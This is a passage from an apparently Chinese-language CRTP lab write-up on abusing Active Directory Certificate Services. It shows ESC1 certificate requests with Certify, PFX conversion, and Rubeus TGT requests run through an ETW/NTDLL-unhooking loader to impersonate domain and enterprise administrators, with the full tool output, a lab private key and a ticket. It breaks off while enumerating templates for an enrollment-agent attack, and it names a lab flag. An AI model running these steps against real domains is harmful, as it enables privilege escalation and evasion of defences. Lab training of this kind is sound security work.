<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag 为 `HTTPSCertificates`</span><br><span class="line"></span><br><span class="line">这个是一个标准的esc1，能够替任何用户申请证书</span><br><span class="line"></span><br><span class="line">这里利用申请个docrp域管的记录一下</span><br><span class="line"></span><br><span class="line">先请求模板，因为是esc1，直接附加要请求证书的目标用户名至altname就ok</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line">PS C:\ad\tools&gt; .\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:administrator</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ &#x27;__| __| |  _| | | |</span><br><span class="line"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |</span><br><span class="line">                             __/ |</span><br><span class="line">                            |___./</span><br><span class="line">  v1.1.0</span><br><span class="line"></span><br><span class="line">[*] Action: Request a Certificates</span><br><span class="line"></span><br><span class="line">[*] Current user context    : dcorp\student522</span><br><span class="line">[*] No subject name specified, using current context as subject.</span><br><span class="line"></span><br><span class="line">[*] Template                : HTTPSCertificates</span><br><span class="line">[*] Subject                 : CN=student522, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local</span><br><span class="line">[*] AltName                 : administrator</span><br><span class="line"></span><br><span class="line">[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA</span><br><span class="line"></span><br><span class="line">[*] CA Response             : The certificate had been issued.</span><br><span class="line">[*] Request ID              : 32</span><br><span class="line"></span><br><span class="line">[*] cert.pem         :</span><br><span class="line"></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEA1rKudKvsYN4P2CoV4iy6NhlJPYb0edtBJlFcuOMejjXaVz3Y</span><br><span class="line">ZErCAZtIL4fLTMUAheKx/4UKM8z3GiibnOTO2wYk60MjB7HouB/sxkfXvRtVhOCg</span><br><span class="line">VOwGsYC9Lv7hVmCm5l0bHmjFWb8L9oN3b4CulLf48J20mhTrc08x/lt8870z6t2Y</span><br><span class="line">wdWPUiNwWzJE331dnL657dE/NKQlKVCRw/6KWkB+fS9P+NE1zip+r27OojujAk9D</span><br><span class="line">J51vFj2h8O6+QYKMH8qTyGTTgAVWIbEpUVuEOSIJ4PeWcoFRVzww+4k3gQ4SBktP</span><br><span class="line">0Qf9tGQsfRryY5aZfXdkp+/h0WRA5Shhtbb3lQIDAQABAoIBACdVrz6y7OjGZnK9</span><br><span class="line">Kys39JnKwi9ilVHqCKKjj3BUNBnr5efL7eRaCfdPYsdKgsW65iChaukcj8TzzWXe</span><br><span class="line">gLwa84cPNh5gO3/CaZeqSa/+I5mC84UXvmgwof1NT9vXWKOBq7JS5pAIs/eAWAm/</span><br><span class="line">BlfIZLPcjOBQlHESWhzTKp6mVls1PcWVbKAq6xMcCngM8TdT+DNZNDTo7p6RpJFL</span><br><span class="line">brUtiAGUh69aCKj62G0/bQTD3h7gVm0iEE97lxhDkCTUFwl5f9gg/XkEPYTlO91P</span><br><span class="line">+9IgS+s3TeOqMZ8ewQy3NtY+pOIyYxtt+fo/PpTBclRohgQZ5GjdFJxifnBz0DbS</span><br><span class="line">vXFteVUCgYEA+apHujaMwOWwXyXG4qT42B6aiFJ86yeocdY3NfesvvIMidOfHvs0</span><br><span class="line">3aZdLCroPi79B7fAkY+TPGaAWsOLY9Io8/azYtvErJ5sVcz4xNRyuHPkvIN5fGCS</span><br><span class="line">gxOOwkXNLgriDFCEAxpvML3RUVjMkW32y+wN78KI6UWyNel7eIg79WMCgYEA3CVE</span><br><span class="line">6M7hoR268u5ZIJjb0bq/gTH62sRLcA76kjek0G+3wX6meLFK3ljiyWuVJnK5HCqA</span><br><span class="line">a6vI/INgvJVHo5Mt0NbheI/4mdG9fIjqxV4kC7jj0O/mwo/5VanR/GuMgove8NdA</span><br><span class="line">I0gxSpX9ScH6Md6e9emQOq4dauQLPD38AXVlzKcCgYEAzL5BHku3+EUk85J2XM2v</span><br><span class="line">qQTH8/25pdsa/2gOVPqtNtYnRCxA9NZLz22sQRla5gwAw4CEspqMw17H6icsu4rQ</span><br><span class="line">vOlWyT6zNmChNWfnpvsWrX+VWKd1THOiE05Jp7Y4goa4RCMPb8AQ6WbxLoXlFWqZ</span><br><span class="line">lzgZYcMmJi9a621zLTCEA0MCgYBuZMIJfLTodmApMhy/m+efZGZkAwwoaAbsSpac</span><br><span class="line">fArJ+zvKbBhOrZk9ppUTLD++6AirdySu2ZYQClGYP8OM42E2OIsYShoACI1cxcv0</span><br><span class="line">7SBmQHD9dU/igRAnROFoEwaC8GD7pPUkvC77l/tL4Vn1aA2Og3Ev++AEmhaIPw0A</span><br><span class="line">Lj6+QQKBgQDtCRkWUSkE8SRQyC44zjEXCxoZMDAnJHeRZ2Ssd8pbqtR+/iiyzLH4</span><br><span class="line">81GS1/MOLt7IOtoNpxmAjCHWXKJgSLJj33HRIrOzcyoT8+I5dQLHK7GyG42Nhq46</span><br><span class="line">mOzghQP/7jVlgiPnjXKUTKkXrbi0ErktGDcSV4umm5WLyV0T488IMw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIGYjCCBUqgAwIBAgITFQAAACAZIo6SNc0W4wAAAAAAIDANBgkqhkiG9w0BAQsF</span><br><span class="line">ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l</span><br><span class="line">eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA1Mjgw</span><br><span class="line">OTE4MzlaFw0yNzA1MjgwOTI4MzlaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ</span><br><span class="line">MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh</span><br><span class="line">cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NTIyMIIBIjAN</span><br><span class="line">BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1rKudKvsYN4P2CoV4iy6NhlJPYb0</span><br><span class="line">edtBJlFcuOMejjXaVz3YZErCAZtIL4fLTMUAheKx/4UKM8z3GiibnOTO2wYk60Mj</span><br><span class="line">B7HouB/sxkfXvRtVhOCgVOwGsYC9Lv7hVmCm5l0bHmjFWb8L9oN3b4CulLf48J20</span><br><span class="line">mhTrc08x/lt8870z6t2YwdWPUiNwWzJE331dnL657dE/NKQlKVCRw/6KWkB+fS9P</span><br><span class="line">+NE1zip+r27OojujAk9DJ51vFj2h8O6+QYKMH8qTyGTTgAVWIbEpUVuEOSIJ4PeW</span><br><span class="line">coFRVzww+4k3gQ4SBktP0Qf9tGQsfRryY5aZfXdkp+/h0WRA5Shhtbb3lQIDAQAB</span><br><span class="line">o4IDDjCCAwowPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC</span><br><span class="line">n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG</span><br><span class="line">AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE</span><br><span class="line">KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI</span><br><span class="line">hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO</span><br><span class="line">AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBQaPnRkqrUDFGPgHdPqMD2DYB1OhTAo</span><br><span class="line">BgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNYWRtaW5pc3RyYXRvcjAfBgNVHSME</span><br><span class="line">GDAWgBTR/o0Kp/q0Mp82/CC498ueaMVF7TCB2AYDVR0fBIHQMIHNMIHKoIHHoIHE</span><br><span class="line">hoHBbGRhcDovLy9DTj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049bWNvcnAtZGMs</span><br><span class="line">Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO</span><br><span class="line">PUNvbmZpZ3VyYXRpb24sREM9bW9uZXljb3JwLERDPWxvY2FsP2NlcnRpZmljYXRl</span><br><span class="line">UmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q</span><br><span class="line">b2ludDCBywYIKwYBBQUHAQEEgb4wgbswgbgGCCsGAQUFBzAChoGrbGRhcDovLy9D</span><br><span class="line">Tj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy</span><br><span class="line">MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bW9uZXlj</span><br><span class="line">b3JwLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0</span><br><span class="line">aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQCwY/LtehcjbM0z</span><br><span class="line">jIZfGOH8vzXt8suS+a8zZ9GtnMrQMQMyuY/uyt98OJ6FFuW3yuawgqe1gI3bxqT9</span><br><span class="line">cdrYzVeDPP3eCk43PXpwSiqGwYmRSWSPCpz3jvAMciloIHZYIcs9mcYKDtrs5Stc</span><br><span class="line">m4ufFvfRRI1dsP/poVK7f+mHXV3YhEyK3/CLXQDsz7NHTpe2bhEREpfngMt8GhWI</span><br><span class="line">1pFlPxvaMd5h8kv45p4eq7pfBW4CKsARlM7zZyW3hE5x6AnhUEZ4GT7WV506nuw2</span><br><span class="line">Z0wmz0YxdD94IGAIwO5YXxI+gp2BKnNUhd0GJoV4zoSEt4kt1S2mr+2mPUDI4ApU</span><br><span class="line">+0xeBzXo</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure>

<p>保存到一个文件中</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-75.png" alt="alt text"></p>
<p>做个转换成pfx，记得输入密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\openssl\openssl.exe pkcs12 -in esc1.txt -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert1.pfx</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-76.png" alt="alt text"></p>
<p>再拿去请求TGT即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; .\Loader.exe -path .\Rubeus.exe -args asktgt /user:administrator /certificate:C:\ad\tools\cert1.pfx /password:123123 /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : asktgt /user:administrator /certificate:C:\ad\tools\cert1.pfx /password:123123 /ptt</span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Got domain: dollarcorp.moneycorp.local</span><br><span class="line">[*] Using PKINIT with etype rc4_hmac and subject: CN=student522, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local</span><br><span class="line">[*] Building AS-REQ (w/ PKINIT preauth) for: &#x27;dollarcorp.moneycorp.local\administrator&#x27;</span><br><span class="line">[*] Using domain controller: 172.16.2.1:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIG4jCCBt6gAwIBBaEDAgEWooIFxjCCBcJhggW+MIIFuqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC</span><br><span class="line">      BWIwggVeoAMCARKhAwIBAqKCBVAEggVMICQMIynBiUhQ2Hr3x/skEakxZdbtKWzaL4IV+uA42UV/jVfE</span><br><span class="line">      MbVFJXfVAWEU95YR5ja20GvIcUeeRE3jTzLodBkrUJf1MzTxsIa7CnbX0m5479j4EfNOSEyl62MzTzsg</span><br><span class="line">      +KbMfvpDhwfUxeh0BgLJTmc3jeKZQ15UMkr9WWvoLYC2Do1D+vfuyqHcB2btOIPIGQbokGfw/MDfjf1L</span><br><span class="line">      vkxU39qroVTyjI+Zp+/wvA9U3lqLeOb5LPTJYr4fBmqVZk404sHUPisXuZqABJBOeAVrvXbfZEziErxw</span><br><span class="line">      YHQFLfKOg3hmk+8mRphQGHWbgufZNtRP0b5G60KgFc5SolR4i4Zml45hpLucjCUEkUIw+gWXUsxtvN++</span><br><span class="line">      l6rEUsusS2LwhQJNpqrK6iRZXAZraLMG2FKXj9RYm7NFDA82VDK2FcALTAqwRWjuskFvS6e1uoXQ4jG4</span><br><span class="line">      7u7TM/JaFJpDD+gWVTXhMruzMmUdnJ+RX2PUizSNj+27BdBQDSAxU3vQgg6a8PzUu9YqfWy1AxXq4+MQ</span><br><span class="line">      O9UfxilPOQrTI1MsA4Fq8uIUKs5A2WU/ekXHLIuexork6RcOAAonNUomJoiO+Kp0JOh3O7fpmwayRvF5</span><br><span class="line">      T3EZ+g0Uj/nuXLR53WYEaA+Oaoyr9WhL+lJPz8sBVc0Y9PtzkVewNqzoJDBnFwhvlWkEqtb3NTEGCtpu</span><br><span class="line">      oSGX1mlcTo+ea3LBtoXlnzhY5zL0mMXGlY3+shGAnTGPmLv9xo5Q4C1aCaBxplZElm1VecGgaSCn1kpF</span><br><span class="line">      gUVE2GVn3N3HRhQDQ1byNqSd4vxAE//rMfSH6BEuqLFREpswzVkDY2Mo6bDcjifxi7A3l2Y/m2QZULXQ</span><br><span class="line">      SJsI9M6fLMPubLH/ljEi8eOwvAYy3+iegy20Eap1kTQOoNweqOsJD+fTQUZDgEyxneBHEomYupojML4o</span><br><span class="line">      jFJBeO28RwXrufA/2GhbGUWVuPawwPaSnddFM2znvVUqh67C9YzTnVPwDTWujyOKDhZQrkJzazV7Il3Q</span><br><span class="line">      ez2lYCZ1XJAvxPG2Q6XhN7XuzOHLOOYW6EwOYaAA/a4Y97EB7TUbxjKFE9B5rJXMIaBqY+RXD6jbjCaT</span><br><span class="line">      1/bGLgxnV2qzR+vdgt3H0ier68Ir11DrQWe7PgM6xMFv1DYvujpYZt+CZaQ1mu1/nNAY+VFjJc5DMfiT</span><br><span class="line">      b57MSbe+ZhZoirnY3BYJMpS29V9uibk9qdN/piGxrrfORkZzxaYYgVeqh9kF42x2DwZ0LXrPwQ8rJtIu</span><br><span class="line">      rZpsx4Kicxwneh4M9Oy6eS3GqDZYJAXNSEdUgGAmDcb4YY7+OzoRyjYFFDO+thgxRkSM26bpU3CTKh/m</span><br><span class="line">      oqOh5IophJph3MaADN20Co9egBulLdfgpMbKY+KGnrpAGGTzfQ8cmChAfBMFMF7bCwgZ19kUq1mmvHy0</span><br><span class="line">      rWz+jiKxecMo3K0+gRkl9v+RclX84Dld1D3gl62kheR/GL/G6tg9s+DC5nCsooCZSQKl0up+rpIKj8zj</span><br><span class="line">      cqw8cI3jqJlTuwkr+HOdhGmi3cBT9bkUIEuTzZT7aus+SPd/65fARjaR0Acn1UquP15b7GsapCVBLVI5</span><br><span class="line">      TaJ0aKlXL1u+CzI6PkuEyF2U3MdYvRGrpHl36ulwJmbwixVKhNfpUEi8Vf58oBSMroYkdscmshOXx1HK</span><br><span class="line">      TUFekldz02yRNMx2DprfTv+va7V7Tz9E9uUI+RzvNgiAYRKRkBvPWjrWlRjJhaUTYGOwcCMm98pwcIqH</span><br><span class="line">      /QHN6ulm+1CASG+NuaHIHDzFLHZN8SwqWqrz3hUVISwcbHybGAVysY+aDztGoSwmTGf1Ds/l61RwwJM8</span><br><span class="line">      o4IBBjCCAQKgAwIBAKKB+gSB932B9DCB8aCB7jCB6zCB6KAbMBmgAwIBF6ESBBDXT3ES4ih4H8coQMSS</span><br><span class="line">      DcUToRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRv</span><br><span class="line">      cqMHAwUAQOEAAKURGA8yMDI1MDUyODA5Mzc1NlqmERgPMjAyNTA1MjgxOTM3NTZapxEYDzIwMjUwNjA0</span><br><span class="line">      MDkzNzU2WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsa</span><br><span class="line">      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/dollarcorp.moneycorp.local</span><br><span class="line">  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  UserName                 :  administrator (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  StartTime                :  5/28/2025 2:37:56 AM</span><br><span class="line">  EndTime                  :  5/28/2025 12:37:56 PM</span><br><span class="line">  RenewTill                :  6/4/2025 2:37:56 AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  109xEuIoeB/HKEDEkg3FEw==</span><br><span class="line">  ASREP (key)              :  10FA3ED2CDAD7B7F4A503ABBCD484FA7</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-77.png" alt="alt text"></p>
<hr>
<p>再来个企业管理员的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Certify.exe request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local\moneycorp<span class="literal">-MCORP-DC-CA</span> /template:HTTPSCertificates /altname:mcorp\administrator</span><br></pre></td></tr></table></figure>

<p>然后也是转换一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\openssl\openssl.exe pkcs12 <span class="operator">-in</span> esc1.txt <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> cert1.pfx</span><br></pre></td></tr></table></figure>

<p>再去请求tgt，因为是林根的企业管理员，所以dc和domain需要用林根域的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> asktgt /dc:mcorp<span class="literal">-dc</span>.moneycorp.local /domain:moneycorp.local /user:administrator /certificate:C:\ad\tools\cert1.pfx /password:<span class="number">123123</span> /ptt</span><br></pre></td></tr></table></figure>

<p>就ok了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-78.png" alt="alt text"></p>
<h2 id="Learning-Objective-21-2"><a href="#Learning-Objective-21-2" class="headerlink" title="Learning Objective - 21	- 2"></a>Learning Objective - 21	- 2</h2><blockquote>
<p>Name of the AD CS template that has EKU of Certificate Request Agent and grants enrollment rights to Domain Users</p>
</blockquote>
<blockquote>
<p>具有“证书请求代理（Certificate Request Agent）”扩展密钥用法（EKU），并授予“Domain Users（域用户）”注册权限的 AD CS 模板名称。</p>
</blockquote>
<p>枚举存在漏洞的证书模板</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt;.\Certify.exe find /vulnerable</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Find certificate templates</span></span><br><span class="line"><span class="string">[*] Using the search base &#x27;</span>CN=Configuration,DC=moneycorp,DC=local<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Listing info about the Enterprise CA &#x27;</span>moneycorp<span class="literal">-MCORP-DC-CA</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Enterprise CA Name            : moneycorp-MCORP-DC-CA</span></span><br><span class="line"><span class="string">    DNS Hostname                  : mcorp-dc.moneycorp.local</span></span><br><span class="line"><span class="string">    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA</span></span><br><span class="line"><span class="string">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span></span><br><span class="line"><span class="string">    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local</span></span><br><span class="line"><span class="string">    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span></span><br><span class="line"><span class="string">    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49</span></span><br><span class="line"><span class="string">    Cert Start Date               : 11/26/2022 1:59:16 AM</span></span><br><span class="line"><span class="string">    Cert End Date                 : 11/26/2032 2:09:15 AM</span></span><br><span class="line"><span class="string">    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local</span></span><br><span class="line"><span class="string">    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!</span></span><br><span class="line"><span class="string">    CA Permissions                :</span></span><br><span class="line"><span class="string">      Owner: BUILTIN\Administrators        S-1-5-32-544</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Access Rights                                     Principal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span></span><br><span class="line"><span class="string">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span></span><br><span class="line"><span class="string">      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512</span></span><br><span class="line"><span class="string">      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line"><span class="string">    Enrollment Agent Restrictions : None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Vulnerable Certificates Templates :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA</span></span><br><span class="line"><span class="string">    Template Name                         : SmartCardEnrollment-Agent</span></span><br><span class="line"><span class="string">    Schema Version                        : 2</span></span><br><span class="line"><span class="string">    Validity Period                       : 10 years</span></span><br><span class="line"><span class="string">    Renewal Period                        : 6 weeks</span></span><br><span class="line"><span class="string">    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH</span></span><br><span class="line"><span class="string">    mspki-enrollment-flag                 : AUTO_ENROLLMENT</span></span><br><span class="line"><span class="string">    Authorized Signatures Required        : 0</span></span><br><span class="line"><span class="string">    pkiextendedkeyusage                   : Certificate Request 